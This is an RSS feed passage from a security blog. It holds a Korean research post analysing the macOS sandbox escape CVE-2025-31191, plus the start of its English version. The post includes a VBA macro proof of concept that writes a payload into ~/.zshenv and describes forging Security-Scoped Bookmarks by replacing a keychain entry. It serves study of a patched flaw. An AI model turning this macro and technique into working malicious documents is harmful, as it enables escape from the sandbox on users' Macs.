&#xD1B5;&#xD574; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xB294;&#xB370;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <strong>&#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xC2B9;&#xC778;&#xC774; &#xC7AC;&#xBD80;&#xD305; &#xD6C4;&#xC5D0;&#xB3C4; &#xC720;&#xC9C0;</strong>&#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xC774; &#xC2B9;&#xC778; &#xC815;&#xBCF4;&#xB294; &#xC5B4;&#xB518;&#xAC00;&#xC5D0; <strong>&#xC601;&#xAD6C; &#xC800;&#xC7A5;</strong>&#xB418;&#xACE0; &#xC788;&#xACE0;, &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xCD94;&#xAC00; &#xC2B9;&#xC778; &#xC5C6;&#xC774;&#xB3C4; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB97C; &#xBC97;&#xC5B4;&#xB09C; &#xD30C;&#xC77C; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9C0;&#xB294; &#xAC83;&#xC774;&#xC8E0;..!!</p><p>&#xC774;&#xB97C; &#xD1A0;&#xB300;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xC138;&#xC6CC;&#xBCFC; &#xC218; &#xC788;&#xC5C8;&#xB294;&#xB370;&#xC694;. </p><ol><li>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xC5EC; &#xC811;&#xADFC; &#xAD8C;&#xD55C; &#xBD80;&#xC5EC;</li><li>&#xC774; &#xAD8C;&#xD55C;&#xC740; Security&#x2011;Scoped Bookmark &#xD615;&#xD0DC;&#xB85C; &#xC800;&#xC7A5;</li><li>&#xC545;&#xC131; &#xB9E4;&#xD06C;&#xB85C;&#xB294; &#xC774; bookmark&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xC544;&#xBB34;&#xB7F0; &#xCD94;&#xAC00; &#xC2B9;&#xC778;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xACE0; &#xD2B9;&#xC815; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;</li><li>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>~/.zshenv</code> &#xAC19;&#xC740; &#xCD08;&#xAE30; &#xC2E4;&#xD589; &#xD30C;&#xC77C; &#xC870;&#xC791; &#x2192; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xBA85;&#xB839; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;</li></ol><blockquote><p><strong>&#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xD1B5;&#xD55C; SSB &#xC545;&#xC6A9;</strong></p></blockquote><p>&#xC704; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xD1A0;&#xB300;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>Excel &#xB610;&#xB294; Word &#xC2E4;&#xD589; &#xD6C4; &#xC0C8; &#xBB38;&#xC11C; &#xC5F4;&#xAE30;</li><li>&#xB2E8;&#xCD95;&#xD0A4; <code>Alt + F11</code> &#x2192; VBA &#xD3B8;&#xC9D1;&#xAE30; &#xC5F4;&#xAE30;</li><li>&#xC0C1;&#xB2E8; &#xBA54;&#xB274;&#xC5D0;&#xC11C; <code>Insert &gt; Module</code> &#xC120;&#xD0DD;</li><li>&#xCF54;&#xB4DC; &#xBD99;&#xC5EC;&#xB123;&#xACE0; &#xC2E4;&#xD589;        <pre><code class="hljs bash">Sub Poc_GrantAccess()    Dim scptPath As String    Dim fileAccessGranted As Boolean    Dim filePermissionCandidates    Dim payload As String    <span class="hljs-string">&apos; Set the payload</span><span class="hljs-string">    payload = &quot;echo pwn&quot;</span><span class="hljs-string"></span><span class="hljs-string">    &apos;</span> Grant file permissions    scptPath = <span class="hljs-string">&quot;/Users/&quot;</span> &amp; Environ(<span class="hljs-string">&quot;USER&quot;</span>) &amp; <span class="hljs-string">&quot;/.zshenv&quot;</span>    filePermissionCandidates = Array(scptPath)    fileAccessGranted = GrantAccessToMultipleFiles(filePermissionCandidates)    <span class="hljs-string">&apos; Create an Application Script</span><span class="hljs-string">    Open scptPath For Output As #1</span><span class="hljs-string">    Print #1, payload</span><span class="hljs-string">    Close #1</span><span class="hljs-string">End Sub</span><span class="hljs-string"></span></code></pre></li></ol><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image10.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image11.png" alt="image.png"></p><p>&#xC774;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2B9;&#xC778; &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; SSB&#xAC00; &#xC545;&#xC6A9;&#xB418;&#xBA74;, &#xADF8; &#xC774;&#xD6C4;&#xC758; &#xC811;&#xADFC;&#xC740; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC815;&#xCC45;&#xC758; &#xBCF4;&#xD638;&#xB97C; &#xC6B0;&#xD68C;</strong>&#xD558;&#xB294; &#xACBD;&#xB85C;&#xB85C; &#xC791;&#xB3D9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image12.png" alt="image.png"></p><p>echo pwn &#xC774; &#xC798; &#xC2E4;&#xD589;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><strong>SSB &#xC800;&#xC7A5; &#xC704;&#xCE58; &#xBC0F; &#xAD6C;&#xC870; &#xBD84;&#xC11D;</strong></p><p>&#xC774; Bookmark&#xAC00; &#xC5B4;&#xB514;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF8; &#xACB0;&#xACFC;, &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC120;&#xD0DD;(&#xD30C;&#xC77C; &#xC811;&#xADFC; &#xC2B9;&#xC778; &#xC5EC;&#xBD80;)&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; <strong>Containers &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xB0B4;&#xBD80;&#xC758; PLIST &#xD30C;&#xC77C;</strong>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xC788;&#xC5C8;&#xC5B4;&#xC694;. </p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image13.png" alt="image.png"></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image14.png" alt="image.png"></p><p>&#xC774; <code>Containers</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB294; App Sandbox&#xC758; &#xC81C;&#xC57D;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xB294; &#xD2B9;&#xC218;&#xD55C; &#xC704;&#xCE58;&#xB77C;&#xC11C;, &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB41C; &#xC571;&#xC774;&#xB77C;&#xB3C4; &#xC774; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC548;&#xC758; &#xD30C;&#xC77C;&#xC5D0;&#xB294; <strong>&#xC790;&#xC720;&#xB86D;&#xAC8C; &#xC811;&#xADFC;</strong>&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC545;&#xC131; &#xC571;&#xC774; &#xC774; PLIST &#xD30C;&#xC77C;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; SSB&#xB97C; &#xC778;&#xC704;&#xC801;&#xC73C;&#xB85C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74;, &#xBCC4;&#xB3C4;&#xC758; &#xC0AC;&#xC6A9;&#xC790; &#xC2B9;&#xC778; &#xC5C6;&#xC774; &#xC784;&#xC758;&#xC758; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC758;&#xBBF8;&#xC8E0;! </p><p>&#xD558;&#xC9C0;&#xB9CC;.. &#xC774; PLIST &#xD30C;&#xC77C;&#xC740; &#xB2E8;&#xC21C;&#xD55C; &#xD14D;&#xC2A4;&#xD2B8;&#xAC00; &#xC544;&#xB2CC; <strong>&#xC11C;&#xBA85;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD615;&#xC2DD;</strong>&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC694;. &#xB530;&#xB77C;&#xC11C; &#xBB34;&#xC791;&#xC815; &#xAC12;&#xC744; &#xB36E;&#xC5B4;&#xC4F0;&#xAC70;&#xB098; entry&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC74; &#xC27D;&#xC9C0;&#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p><blockquote><p><strong>ScopedBookmarkAgent &#xBD84;&#xC11D;</strong></p></blockquote><p>&#xC774; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;&#xC744; &#xC880; &#xB354; &#xAE4A;&#xC774; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574; macOS&#xC758; &#xAD00;&#xB828; &#xBAA8;&#xB4C8;&#xB4E4;&#xC744; &#xB9AC;&#xBC84;&#xC2F1;&#xD558;&#xBA70; &#xAD6C;&#xC870;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4;&#xB41C; &#xC571;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xB85C;&#xBD80;&#xD130; Open dialog&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xC2B9;&#xC778;&#xC744; &#xBC1B;&#xC544;&#xC57C;&#xB9CC; &#xC678;&#xBD80; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. &#xC774; Open dialog&#xB294; <code>com.apple.appkit.xpc.openAndSavePanelService.xpc</code>&#xB77C;&#xB294; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC678;&#xBD80; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD30C;&#xC77C;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xBA74;, &#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC120;&#xD0DD;&#xB41C; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD655;&#xC7A5;(Sandbox Extension) &#xD615;&#xD0DC;&#xB85C; &#xC571;&#xC5D0;&#xAC8C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD655;&#xC7A5;&#xC740; &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB418;&#xC5B4; <code>HMAC-SHA256</code>&#xC73C;&#xB85C; &#xC11C;&#xBA85;&#xB41C; &#xD1A0;&#xD070;&#xC774;&#xBA70; &#xC2E4;&#xC81C; &#xD30C;&#xC77C; &#xACBD;&#xB85C;, &#xAD8C;&#xD55C; &#xC815;&#xBCF4;(<code>com.apple.app-sandbox.read-write</code> &#xB4F1;), &#xD30C;&#xC77C; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xB4F1;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC694;. &#xC774; &#xD655;&#xC7A5;&#xC744; &#xBC1B;&#xC740; &#xC571;&#xC740; <code>libsystem_sandbox.dylib</code> &#xD558;&#xC704; API&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xD655;&#xC7A5; &#xD1A0;&#xD070;&#xC740; <strong>&#xC7AC;&#xBD80;&#xD305; &#xC2DC;&#xB9C8;&#xB2E4; &#xBB34;&#xD6A8;&#xD654;</strong>&#xB41C;&#xB2E4;&#xB294; &#xC81C;&#xC57D;&#xC774; &#xC788;&#xC5C8;&#xC8E0;.</p><p>&#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; Apple&#xC740; &#xC0C8;&#xB85C;&#xC6B4; &#xBE44;&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; <strong>ScopedBookmarkAgent</strong>&#xB97C; &#xB3C4;&#xC785;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; Agent&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xB450; &#xAC00;&#xC9C0; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD574;&#xC694;.</p><ol><li>&#xBC1B;&#xC740; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD655;&#xC7A5;&#xC744; &#xAC80;&#xC99D; &#xD6C4;, &#xC7A5;&#xAE30; &#xBCF4;&#xAD00; &#xAC00;&#xB2A5;&#xD55C; Bookmark &#xAC1D;&#xCCB4;&#xB85C; &#xBCC0;&#xD658;</li><li>&#xC800;&#xC7A5;&#xB41C; Bookmark &#xB370;&#xC774;&#xD130;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C;, &#xC0C8;&#xB85C;&#xC6B4; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD655;&#xC7A5; &#xD1A0;&#xD070;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xC804;&#xB2EC;</li></ol><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; Microsoft Office &#xAC19;&#xC740; &#xC571;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD750;&#xB984;&#xC73C;&#xB85C; SSB&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;!</p><ul><li>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD30C;&#xC77C; &#xC811;&#xADFC;&#xC744; &#xC2B9;&#xC778; &#x2192; <code>securebookmarks.plist</code>&#xC5D0; bookmark &#xC800;&#xC7A5;</li><li>&#xC774;&#xD6C4; &#xB3D9;&#xC77C;&#xD55C; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xC2DC; &#x2192; ScopedBookmarkAgent&#xB97C; &#xD1B5;&#xD574; bookmark &#x2192; &#xC0C8;&#xB85C;&#xC6B4; &#xD655;&#xC7A5; &#xD1A0;&#xD070; &#xC0DD;&#xC131;</li></ul><p>&#xC774; bookmark &#xAC1D;&#xCCB4; &#xC5ED;&#xC2DC; HMAC-SHA256&#xC73C;&#xB85C; &#xC11C;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD0A4;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xACC4;&#xC0B0;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ini"><span class="hljs-attr">cryptoKey</span> = HMAC-SHA256(secret, <span class="hljs-string">&quot;[bundle-id]&quot;</span>)</code></pre><p>&#xC774;&#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>secret</code>&#xC740; <strong>macOS Keychain</strong>&#xC758; <code>com.apple.scopedbookmarksagent.xpc</code> &#xD56D;&#xBAA9;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC784;&#xC758;&#xB85C; bookmark&#xB97C; &#xC11C;&#xBA85;&#xD558;&#xAC70;&#xB098; &#xC870;&#xC791;&#xD558;&#xB294; &#xAC74; &#xB9E4;&#xC6B0; &#xC5B4;&#xB835;&#xAC8C; &#xC124;&#xACC4;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC694;.. &#xACB0;&#xAD6D; &#xACF5;&#xACA9;&#xC790;&#xAC00; sandbox escape&#xB97C; &#xC704;&#xD574; bookmark&#xB97C; &#xC704;&#xC870;&#xD558;&#xB824;&#xBA74; <strong>ScopedBookmarkAgent&#xC758; &#xC11C;&#xBA85; &#xD0A4;&#xB97C; &#xD0C8;&#xCDE8;&#xD558;&#xAC70;&#xB098;</strong>, &#xC720;&#xD6A8;&#xD55C; bookmark&#xB97C; &#xC6B0;&#xD68C;&#xC801;&#xC73C;&#xB85C; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.. &#xC880; &#xBCF5;&#xC7A1;&#xD558;&#xC8E0;?</p><blockquote><p><strong>Keychain ACL &#xC6B0;&#xD68C;</strong></p></blockquote><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image15.png" alt="image.png"></p><p>macOS&#xC5D0;&#xC11C; <strong>Keychain</strong>(&#xD0A4;&#xCCB4;&#xC778;)&#xC740; &#xC554;&#xD638;&#xB098; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xACF5;&#xAC04;&#xC774;&#xC5D0;&#xC694;. Windows&#xC758; Credential Manager&#xC640; &#xC720;&#xC0AC;&#xD558;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC5B4;&#xC694;.<br>&#xC774; Keychain&#xC758; &#xC911;&#xC694;&#xD55C; &#xD2B9;&#xC9D5;&#xC740;, <strong>&#xAC01; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD574; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xB294; ACL</strong>(Access Control List)&#xC774; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xAD00;&#xC2EC;&#xC788;&#xAC8C; &#xBCF8; &#xD0A4;&#xCCB4;&#xC778; &#xD56D;&#xBAA9;&#xC740; &#xBC14;&#xB85C; <code>com.apple.scopedbookmarksagent.xpc</code> &#xD56D;&#xBAA9;&#xC774;&#xC5C8;&#xACE0;, &#xC774; &#xD56D;&#xBAA9;&#xC740; &#xC624;&#xC9C1; <strong>ScopedBookmarkAgent</strong>&#xB9CC; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; ACL&#xC774; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xADF8;&#xB7F0;&#xB370;&#x2026;! &#xC774; ACL&#xC740; <strong>&#x2018;&#xC77D;&#xAE30;&#x2019; &#xAD8C;&#xD55C;&#xB9CC; &#xC81C;&#xC5B4;</strong>&#xD55C;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC5B4;&#xC694;.</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image16.png" alt="image.png"></p><p>&#xC989;, &#xAE30;&#xC874; &#xD56D;&#xBAA9;&#xC744; <strong>&#xC0AD;&#xC81C;&#xD558;&#xACE0;</strong>, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB9CC;&#xB4E0; <strong>&#xC0C8; &#xD56D;&#xBAA9;&#xC744; &#xAC19;&#xC740; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xB4F1;&#xB85D;</strong>&#xD558;&#xB294; &#xAC74; &#xAC00;&#xB2A5;&#xD588;&#xB358; &#xAC70;&#xC608;&#xC694;!</p><p>&#xC2EC;&#xC9C0;&#xC5B4; &#xC0C8; &#xD56D;&#xBAA9;&#xC5D0; &#xB300;&#xD55C; <strong>ACL&#xB3C4; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC9C1;&#xC811; &#xC124;&#xC815;</strong>&#xD560; &#xC218; &#xC788;&#xC5C8;&#xACE0;, ScopedBookmarkAgent&#xAC00; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC5C8;&#xC5B4;&#xC694;.</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image17.png" alt="image.png"></p><p>&#xC774;&#xB807;&#xAC8C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xACE0;&#xC815;&#xB41C; secret &#xAC12;&#xC744; &#xAC16;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD56D;&#xBAA9;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xB450;&#xBA74;, ScopedBookmarkAgent&#xB294; &#xC544;&#xBB34;&#xB7F0; &#xC758;&#xC2EC; &#xC5C6;&#xC774; &#xADF8; &#xD0A4;&#xB97C; &#xBC1B;&#xC544;&#xB4E4;&#xC5EC; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB418;&#xB294; &#xAC70;&#xC8E0;.</p><p>&#xC704; &#xB0B4;&#xC6A9;&#xC744; &#xD1A0;&#xB300;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD0A4;&#xCCB4;&#xC778;&#xC758; ACL &#xAD6C;&#xC870;&#xC640; &#xC11C;&#xBA85; &#xD0A4; &#xD30C;&#xC0DD; &#xAD6C;&#xC870;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC;, <strong>&#xC784;&#xC758;&#xC758; SSB&#xB97C; &#xC870;&#xC791;&#xB7;&#xC11C;&#xBA85;&#xD558;&#xACE0;</strong>, &#xC774;&#xB97C; &#xD1B5;&#xD574; <strong>&#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC6B0;&#xD68C; &#xACBD;&#xB85C;&#xB97C; &#xD655;&#xBCF4;</strong>&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; SSB&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBAA8;&#xB4E0; macOS &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xC571;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC904; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xB2E8;&#xC77C; &#xC571;&#xC5D0; &#xAD6D;&#xD55C;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xBC94;&#xC6A9;  macOS Sandbox Escape &#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xC545;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xAD49;&#xC7A5;&#xD788; &#xC704;&#xD5D8;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;..&#x314E;&#x314E;</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C; Sandbox Escape&#xC5D0; &#xB300;&#xD574; &#xACF5;&#xBD80;&#xD574;&#xBD24;&#xB294;&#xB370;&#xC694;! &#xC7AC;&#xBC0C;&#xB124;&#xC694;&#x2026; </p><p>&#xB2E4;&#xC74C;&#xBC88;&#xC5D0;&#xB3C4; &#xC7AC;&#xBC0C;&#xAC8C; &#xACF5;&#xBD80;&#xD574;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;~ &#xCC21;&#xAE0B;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://support.apple.com/en-us/122375">https://support.apple.com/en-us/122375</a></p><p><a href="https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/">https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/</a></p><p><a href="https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/">https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/</a></p><p><a href="https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf">https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf</a></p><p><a href="https://github.com/yo-yo-yo-jbo/macos_app_structure">https://github.com/yo-yo-yo-jbo/macos_app_structure</a></p><p><a href="https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/">https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Sandbox-Escape/">Sandbox Escape</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] macOS: Part2 - Sandbox Escape (en)</title>
      <link>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/</link>
      <guid>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/</guid>
      <pubDate>Thu, 07 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/&quot;&gt;macOS: Part0 - TCC Bypass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyb</description>
        
      
      
      
      <content:encoded><![CDATA[<p><a href="https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/">macOS: Part0 - TCC Bypass</a></p><p><a href="https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/">macOS: Part1 - SIP Bypass</a> </p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/MacOS_Sandbox_Escape.png" alt="image.png"></p><p>macOS: Part2 - Sandbox Escape &#x2190; Now!</p><p>Hello~ I&#x2019;m clalxk!</p><p>Today, following Part1, I studied Sandbox Escape.</p><p>From the concept of the macOS Sandbox to the analysis of a 1-day vulnerability (CVE-2025-31191), it&#x2019;s all here&#x2014;let&#x2019;s learn together.. (&gt;&lt;)</p><h2 id="0-App"><a href="#0-App" class="headerlink" title="0. App"></a>0. App</h2><p>If you&#x2019;ve used Windows or Linux, the concept of an <code>App</code> on macOS might feel unfamiliar. It&#x2019;s unfamiliar, but not difficult b^_^b. Generally, when you run a single executable file (<code>.exe</code>, <code>a.out</code>), you think of the program starting immediately, loading libraries or config files from somewhere in the system as needed.</p><p>For example, on Windows, if you run <code>notepad++.exe</code>, that one file launches the process.</p><p>During that process, required <code>.dll</code> libraries are dynamically loaded from system folders or the installation path, and settings are stored externally in <code>.ini</code> files or the registry.</p><p>However! On macOS, this structure is slightly different.</p><p>On macOS, an <code>App</code> isn&#x2019;t just a simple executable file but a 